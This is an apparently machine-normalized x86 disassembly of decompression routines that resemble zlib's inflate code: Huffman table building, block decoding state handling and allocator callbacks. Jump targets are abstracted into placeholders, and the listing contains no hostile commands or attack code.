sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
shr [ esp + 0x8 ] 0x3
sub edi 0x3
mov [ ebx ] 0x3
jmp r-xdata
dec edx
je r-xdata
xor eax eax
mov eax 0x7
jmp r-xdata
mov [ ebx ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
push eax
mov edx [ esp + 0x10 ]
push edx
mov ecx [ esp + 0x1c ]
push ecx
call sub_3ae5438
add esp 0xc
mov eax [ esp + 0x4 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
sub [ esp + 0x10 ] edx
add [ esp + 0x14 ] eax
sub ebp [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
sub [ ebx + 0x4 ] ecx
jne r-xdata
mov [ esp + 0x4 ] ebp
mov eax [ esp + 0x14 ]
mov edx esi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
mov [ esp ] eax
mov edx [ ebx + 0x34 ]
mov [ esp + 0x14 ] edx
mov ecx [ esp + 0x14 ]
cmp ecx [ ebx + 0x30 ]
jae r-xdata
mov ecx [ ebx + 0x28 ]
mov [ esp + 0x14 ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
shr [ esp + 0x8 ] 0xe
sub edi 0xe
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
jmp r-xdata
mov [ esp ] 0xfffffffc
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx edi
dec [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov al [ edx ]
xor edx edx
mov dl al
shl edx cl
or [ esp + 0x8 ] edx
inc [ esp + 0xc ]
add edi 0x8
cmp edi 0x3
jb r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x5
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esp ] eax
cmp [ esp ] 0xfffffffd
jne r-xdata
mov eax edx
sub eax 0xe
mov eax 0x7
jmp r-xdata
mov ecx edi
dec [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x8 ] eax
inc [ esp + 0xc ]
add edi 0x8
cmp edi [ esp + 0x4 ]
jb r-xdata
shr [ esp + 0x8 ] 0x3
mov [ ebx ] 0x9
sub edi 0x3
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov ebp [ ebx + 0x2c ]
sub ebp [ esp + 0x14 ]
mov ebp [ ebx + 0x30 ]
sub ebp [ esp + 0x14 ]
dec ebp
jmp r-xdata
mov ebp [ ebx + 0x2c ]
sub ebp [ esp + 0x14 ]
mov ebp [ ebx + 0x30 ]
sub ebp [ esp + 0x14 ]
dec ebp
jmp r-xdata
mov edx [ esp + 0x8 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] edi
mov ecx [ esp + 0x10 ]
mov [ esi + 0x4 ] ecx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov [ ebx ] 0x9
mov ecx 0x3
mov ecx 0xb
jmp r-xdata
cmp edx 0x12
jne r-xdata
xor eax eax
mov eax 0x7
jmp r-xdata
test ebp ebp
jne r-xdata
mov edx [ ebx + 0x30 ]
cmp edx [ ebx + 0x28 ]
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x2c ]
jne r-xdata
mov ecx [ esp + 0x4 ]
add ecx eax
cmp edi ecx
jb r-xdata
mov [ esp + 0x28 ] ecx
jmp r-xdata
mov [ ebx ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov ecx [ esp + 0xc ]
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov eax [ esp + 0xc ]
mov [ esi ] eax
mov eax ebx
mov edx [ esp + 0x14 ]
mov [ ebx + 0x34 ] edx
mov edx esi
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov ecx [ ebx + 0x28 ]
mov [ esp + 0x14 ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
shr [ esp + 0x8 ] cl
mov ecx [ eax * 4 + rw-data ]
sub edi [ esp + 0x4 ]
and ecx [ esp + 0x8 ]
sub edi eax
add [ esp + 0x28 ] ecx
mov ecx eax
shr [ esp + 0x8 ] cl
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov [ esp + 0x4 ] ecx
mov ebp [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
shr ebp 0x5
and ecx 0x1f
and ebp 0x1f
add ecx ebp
mov ebp [ esp + 0x28 ]
add ebp eax
add ecx 0x102
cmp ecx ebp
jb r-xdata
mov ebp [ ebx + 0x2c ]
sub ebp [ esp + 0x14 ]
mov ebp [ ebx + 0x30 ]
sub ebp [ esp + 0x14 ]
dec ebp
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] edi
mov edx [ esp + 0x10 ]
mov [ esi + 0x4 ] edx
mov eax [ esp + 0xc ]
sub eax [ esi ]
add [ esi + 0x8 ] eax
mov eax ebx
mov edx [ esp + 0xc ]
mov [ esi ] edx
mov edx esi
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
xor ecx ecx
mov [ esp ] ecx
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ esp ] 0xfffffffd
mov ecx [ esp + 0x8 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] edi
mov eax [ esp + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0xc ]
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov edx esi
mov ecx [ esp + 0xc ]
mov [ esi ] ecx
mov eax [ esp + 0x14 ]
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
cmp edx 0x10
jne r-xdata
dec [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov cl [ ecx ]
mov ebp ecx
and ebp 0xff
mov ecx edi
shl ebp cl
or [ esp + 0x8 ] ebp
inc [ esp + 0xc ]
add edi 0x8
cmp edx 0x10
jne r-xdata
cmp eax 0x1
jae r-xdata
xor ecx ecx
mov edx [ ebx + 0xc ]
mov ecx [ edx + eax * 4 - 0x4 ]
jmp r-xdata
mov ecx [ ebx + 0xc ]
mov [ ecx + eax * 4 ] edx
inc eax
dec [ esp + 0x28 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
mov edx ecx
sub_3ae8150
push ebx
push esi
mov ebx edx
mov esi eax
xor ecx ecx
mov edx ebx
mov eax esi
call sub_3ae737c
mov edx [ esi + 0x28 ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
mov edx esi
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor eax eax
pop esi
pop ebx
retn
sub_3ae8180
push ebx
push esi
mov esi ecx
mov ebx eax
push esi
push edx
mov eax [ ebx + 0x28 ]
push eax
call sub_3ae5438
add esp 0xc
mov edx [ ebx + 0x28 ]
add edx esi
mov [ ebx + 0x34 ] edx
mov [ ebx + 0x30 ] edx
pop esi
pop ebx
retn
sub_3ae81b0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8c ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x28 ] 0x4
mov ecx [ ebp - 0x28 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x28 ] 0x4
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x28 ] 0x4
mov ecx [ ebp - 0x28 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x28 ] 0x4
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x28 ] 0x4
mov ecx [ ebp - 0x28 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x28 ] 0x4
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x28 ] 0x4
mov ecx [ ebp - 0x28 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x28 ] 0x4
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x28 ] 0x4
mov ecx [ ebp - 0x28 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x28 ] 0x4
mov edx [ ebp - 0x28 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] edx
mov ecx [ ebp - 0x28 ]
mov eax [ ecx ]
inc [ ebp + eax * 4 - 0x8c ]
add [ ebp - 0x28 ] 0x4
dec [ ebp - 0x1c ]
jne r-xdata
mov edx [ ebp - 0x8c ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp + 0x14 ]
mov eax 0x1
mov ecx [ edx ]
lea edx [ ebp - 0x88 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x40 ] edx
mov ecx [ ebp + 0x18 ]
xor eax eax
mov [ ecx ] eax
xor ecx ecx
mov edx [ ebp + 0x14 ]
xor eax eax
mov [ edx ] ecx
jmp r-xdata
mov [ ebp - 0x20 ] eax
cmp eax [ ebp - 0x24 ]
jbe r-xdata
inc eax
add [ ebp - 0x40 ] 0x4
cmp eax 0xf
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov [ ebp - 0x1c ] 0xf
lea edx [ ebp - 0x50 ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x40 ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x1c ]
jbe r-xdata
dec [ ebp - 0x1c ]
add [ ebp - 0x44 ] 0xfffffffc
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov ecx eax
mov edx 0x1
shl edx cl
mov [ ebp - 0x3c ] edx
lea ecx [ ebp + eax * 4 - 0x8c ]
mov [ ebp - 0x44 ] ecx
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x44 ]
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x3c ]
sub eax [ ebp + edx * 4 - 0x8c ]
mov [ ebp - 0x3c ] eax
test eax eax
jge r-xdata
mov edx [ ebp - 0x44 ]
mov ecx [ ebp - 0x3c ]
sub ecx [ edx ]
mov [ ebp - 0x3c ] ecx
test ecx ecx
jge r-xdata
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x3c ]
add [ ebp + edx * 4 - 0x8c ] ecx
xor edx edx
mov [ ebp - 0x104 ] edx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x28 ] ecx
lea ecx [ ebp - 0x100 ]
mov eax edx
jmp r-xdata
mov eax 0xfffffffd
jmp r-xdata
add [ ebp - 0x44 ] 0x4
shl [ ebp - 0x3c ] 0x1
inc eax
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov eax 0xfffffffd
jmp r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov edx [ ebp - 0x28 ]
add [ ebp - 0x28 ] 0x4
add eax [ edx ]
mov [ ecx ] eax
add ecx 0x4
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x8 ]
jb r-xdata
mov ecx [ ebp + eax * 4 - 0x108 ]
inc [ ebp + eax * 4 - 0x108 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ eax + ecx * 4 ] edx
mov edx [ ebp - 0x28 ]
add [ ebp - 0x28 ] 0x4
mov eax [ edx ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp + eax * 4 - 0x108 ]
mov [ ebp - 0x8 ] edx
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x108 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] 0xffffffff
mov edx [ ebp - 0x24 ]
neg edx
mov [ ebp - 0x38 ] edx
xor eax eax
mov [ ebp - 0xc8 ] eax
xor edx edx
mov [ ebp - 0x2c ] edx
xor esi esi
mov eax [ ebp - 0x20 ]
lea edx [ ebp + eax * 4 - 0x8c ]
mov [ ebp - 0x44 ] edx
mov ecx [ ebp - 0x20 ]
cmp ecx [ ebp - 0x14 ]
jg r-xdata
cmp [ ebp - 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
xor eax eax
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov ecx [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xffffffff
test ecx ecx
jne r-xdata
mov eax 0xfffffffb
jmp r-xdata
mov ecx [ ebp - 0x18 ]
lea eax [ ebp + ecx * 4 - 0x108 ]
mov [ ebp - 0x4c ] eax
mov edx [ ebp - 0x18 ]
lea ecx [ ebp + edx * 4 - 0xc8 ]
mov [ ebp - 0x48 ] ecx
jmp r-xdata
inc [ ebp - 0x20 ]
add [ ebp - 0x44 ] 0x4
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x20 ]
jl r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x4c ] 0x4
add [ ebp - 0x48 ] 0x4
mov eax [ ebp - 0x24 ]
add [ ebp - 0x38 ] eax
mov esi [ ebp - 0x14 ]
sub esi [ ebp - 0x38 ]
cmp esi [ ebp - 0x24 ]
jbe r-xdata
mov dl [ ebp - 0x20 ]
sub dl [ ebp - 0x38 ]
mov [ ebp - 0x33 ] dl
mov ecx [ ebp - 0x8 ]
shl ecx 0x2
add ecx [ ebp + 0x8 ]
cmp ecx [ ebp - 0x28 ]
ja r-xdata
mov eax esi
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov [ ebp - 0x34 ] 0xc0
jmp r-xdata
mov ecx eax
mov esi 0x1
shl esi cl
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov ecx edx
add ecx esi
cmp ecx 0x5a0
jbe r-xdata
sub edx ebx
mov ecx [ ebp - 0x20 ]
shl ecx 0x2
lea ebx [ ebp - 0x8c ]
add ecx ebx
cmp esi eax
jbe r-xdata
mov esi eax
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x38 ]
mov edx 0x1
mov ecx eax
mov ebx [ ebp - 0x10 ]
shl edx cl
inc ebx
cmp edx ebx
jbe r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
sub eax [ ebp - 0xc ]
mov edx [ ebp + 0x1c ]
mov cl [ edx + eax * 4 ]
add cl 0x50
mov [ ebp - 0x34 ] cl
mov edx [ ebp + 0x20 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x30 ] eax
add [ ebp - 0x28 ] 0x4
cmp eax 0x100
jae r-xdata
mov ecx [ ebp - 0x20 ]
sub ecx [ ebp - 0x38 ]
mov edx 0x1
shl edx cl
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x1c ]
shr eax cl
cmp esi eax
jbe r-xdata
shl edx 0x3
add edx [ ebp + 0x10 ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x48 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
add [ edx ] esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax 0xfffffffd
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
dec ecx
mov eax 0x1
shl eax cl
jmp r-xdata
mov ecx [ ebp - 0x2c ]
mov ebx [ ebp - 0x34 ]
mov [ ecx + eax * 8 ] ebx
mov ebx [ ebp - 0x30 ]
mov [ ecx + eax * 8 + 0x4 ] ebx
add eax edx
cmp esi eax
ja r-xdata
mov dl 0x60
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x2c ]
mov [ eax ] edx
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
mov [ ecx ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x33 ] cl
mov [ ebp - 0x34 ] al
mov ecx [ ebp - 0x38 ]
sub ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
shr eax cl
mov edx [ ebp - 0x48 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp - 0x2c ]
sub ecx edx
test ecx ecx
jns r-xdata
inc eax
cmp esi eax
ja r-xdata
test [ ebp - 0x1c ] eax
jne r-xdata
mov [ ebp - 0x34 ] dl
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
mov [ ebp - 0x30 ] ecx
add [ ebp - 0x28 ] 0x4
jmp r-xdata
sar ecx 0x3
sub ecx eax
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0x34 ]
mov [ edx + eax * 8 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ edx + eax * 8 + 0x4 ] ecx
jmp r-xdata
add ecx 0x7
add edx edx
add ecx 0x4
cmp edx [ ecx ]
jbe r-xdata
xor [ ebp - 0x1c ] eax
shr eax 0x1
xor [ ebp - 0x1c ] eax
mov eax 0x1
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x18 ]
shl eax cl
lea edx [ ebp + edx * 4 - 0x108 ]
dec eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
sub edx [ ecx ]
and eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4c ]
cmp eax [ edx ]
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0x4c ] 0xfffffffc
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
mov eax 0x1
shl eax cl
dec eax
sub_3ae86a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xc ] eax
mov ecx 0x4
mov edx 0x13
mov eax [ ebx + 0x28 ]
call [ ebx + 0x20 ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
push edx
mov ecx [ ebp - 0x10 ]
mov edx 0x13
push ecx
mov ecx 0x13
mov eax esi
call sub_3ae81b0
mov esi eax
cmp esi 0xfffffffd
jne r-xdata
mov eax 0xfffffffc
jmp r-xdata
cmp esi 0xfffffffb
je r-xdata
mov [ ebx + 0x18 ] rw-data
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
mov eax esi
sub_3ae8744
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
mov ecx 0x4
mov edx 0x120
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
push rw-data
push rw-data
mov edx [ ebp + 0x14 ]
push edx
lea edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x1c ]
push ecx
mov eax [ ebp + 0xc ]
push eax
push edx
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx 0x101
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_3ae81b0
mov ebx eax
test ebx ebx
jne r-xdata
mov eax 0xfffffffc
jmp r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp ebx 0xfffffffc
je r-xdata
mov [ esi + 0x18 ] rw-data
jmp r-xdata
push rw-data
push rw-data
mov edx [ ebp + 0x10 ]
push edx
lea edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x18 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
push edx
mov ecx [ ebp - 0x14 ]
push ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
shl eax 0x2
add eax [ ebp - 0xc ]
xor ecx ecx
call sub_3ae81b0
mov ebx eax
test ebx ebx
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov eax ebx
jmp r-xdata
mov [ esi + 0x18 ] rw-data
mov ebx 0xfffffffd
cmp ebx 0xfffffffd
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
cmp ebx 0xfffffffb
jne r-xdata
mov [ esi + 0x18 ] rw-data
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
xor eax eax
cmp [ ebp - 0x4 ] 0x101
jbe r-xdata
cmp ebx 0xfffffffc
je r-xdata
mov [ esi + 0x18 ] rw-data
mov ebx 0xfffffffd
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov eax ebx
jmp r-xdata
mov [ esi + 0x18 ] rw-data
mov ebx 0xfffffffd
sub_3ae8884
push ebp
mov ebp esp
push ebx
mov ebx [ rw-data ]
mov [ eax ] ebx
mov eax [ rw-data ]
mov [ edx ] eax
mov [ ecx ] rw-data
mov edx [ ebp + 0xc ]
xor eax eax
mov [ edx ] rw-data
pop ebx
pop ebp
retn 0x8
sub_3ae88b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ecx 0x1c
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor edx edx
mov [ ebx ] edx
mov cl [ ebp - 0x4 ]
mov [ ebx + 0x10 ] cl
mov al [ ebp - 0x8 ]
mov [ ebx + 0x11 ] al
mov edx [ ebp - 0xc ]
mov [ ebx + 0x14 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebx + 0x18 ] ecx
sub_3ae8900
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebx eax
mov esi edx
mov [ esp ] ecx
mov eax [ ebx + 0x4 ]
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x4 ]
mov edi [ esi ]
mov [ esp + 0x14 ] eax
mov edx [ ebx + 0x20 ]
mov [ esp + 0x10 ] edx
mov eax [ ebx + 0x34 ]
mov ebp [ ebx + 0x1c ]
cmp eax [ ebx + 0x30 ]
jae r-xdata
mov edx [ ebx + 0x2c ]
sub edx eax
mov edx [ ebx + 0x30 ]
sub edx eax
dec edx
jmp r-xdata
mov [ esp ] 0xfffffffe
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp [ edx * 4 + jump_table_3ae8957 ]
mov [ esp + 0x18 ] edx
cmp [ esp + 0x18 ] 0x102
jb r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0xc ]
mov [ esp + 0x4 ] edx
cmp ebp [ esp + 0x4 ]
jae r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0x8 ]
mov [ esp + 0x4 ] edx
cmp ebp [ esp + 0x4 ]
jae r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ edx + 0xc ]
mov [ esp + 0x4 ] ecx
cmp ebp [ esp + 0x4 ]
jae r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ edx + 0x8 ]
mov [ esp + 0x4 ] ecx
cmp ebp [ esp + 0x4 ]
jae r-xdata
mov edx [ esp + 0x20 ]
mov ecx eax
sub ecx [ edx + 0xc ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
cmp [ esp + 0x18 ] 0x0
jne r-xdata
cmp ebp 0x7
jbe r-xdata
mov [ esp ] 0x1
mov edx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov ecx [ esp + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx edi
sub edx [ esi ]
add [ esi + 0x8 ] edx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3ae91a8
jmp r-xdata
mov [ esp ] 0xfffffffd
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x1c ] ebp
mov edx [ esp + 0x14 ]
mov ecx edi
mov [ esi + 0x4 ] edx
mov edx esi
sub ecx [ esi ]
add [ esi + 0x8 ] ecx
mov [ esi ] edi
mov [ ebx + 0x34 ] eax
mov eax ebx
mov ecx [ esp ]
call sub_3ae91a8
jmp r-xdata
mov edx [ esp + 0x20 ]
xor ecx ecx
mov cl [ edx + 0x10 ]
mov edx [ esp + 0x20 ]
mov [ edx + 0xc ] ecx
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0x14 ]
mov ecx [ esp + 0x20 ]
mov [ ecx + 0x8 ] edx
mov edx [ esp + 0x20 ]
mov [ edx ] 0x1
cmp [ esp + 0x14 ] 0xa
jb r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
mov ecx [ ecx * 4 + rw-data ]
and ecx [ esp + 0x10 ]
shl ecx 0x3
add edx ecx
mov [ esp + 0x8 ] edx
mov edx [ esp + 0x8 ]
mov dl [ edx + 0x1 ]
mov ecx edx
and edx 0xff
